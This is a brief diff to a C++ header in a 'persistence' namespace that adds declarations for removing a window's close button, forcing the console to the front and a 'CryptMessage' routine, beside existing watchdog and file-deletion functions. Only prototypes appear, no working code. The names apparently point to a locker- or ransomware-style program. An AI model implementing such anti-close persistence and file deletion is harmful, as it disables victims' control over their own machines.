@@ -18,6 +18,9 @@ void StopExe();
 bool isProcessRunning(const char* exeName);
 void watchdogLoop();
 void deleteMainFiles();
+void RemoveCloseButton();
+void ForceConsoleToFront();
+void CryptMessage();
 
 } // namespace persistence
 
